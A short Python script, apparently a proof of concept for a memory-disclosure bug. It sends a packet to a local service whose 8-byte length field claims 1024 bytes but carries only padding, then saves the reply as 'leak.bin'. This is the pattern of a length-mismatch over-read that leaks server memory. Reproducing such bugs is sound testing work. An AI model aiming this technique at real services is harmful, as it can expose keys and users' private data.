import socket, time
time.sleep(0.3)
s = socket.create_connection(("127.0.0.1", 18082), timeout=5)
# first 8 bytes = 1024 little-endian; rest is padding
payload = bytes([0x00, 0x04, 0, 0, 0, 0, 0, 0]) + b"PADDINGPADDING"
s.sendall(payload)
s.shutdown(socket.SHUT_WR)
got = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        got += chunk
except Exception as e:
    print("recv error", e)
print("SENT", len(payload), "bytes; PEER GOT", len(got), "bytes")
open("/tmp/os50/leak.bin", "wb").write(got)
